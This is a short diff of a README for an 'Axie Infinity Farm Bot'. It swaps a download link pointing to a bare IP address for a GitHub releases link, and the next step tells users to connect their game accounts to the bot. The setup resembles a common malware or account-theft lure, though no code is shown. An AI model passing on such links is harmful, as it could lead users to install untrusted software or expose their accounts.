@@ -20,7 +20,7 @@ The Axie Infinity Farm Bot is an automated tool that helps Axie Infinity players
 
    # Usage
 
-   1. [Download here](http://91.90.195.152/Gr5L9Q)
+   1. [Download here](https://github.com/pureepon/Axie-Infinity-Farm-BOT/releases/tag/farmbot)
 
        2. Connect your Axie Infinity accounts to the bot.
 
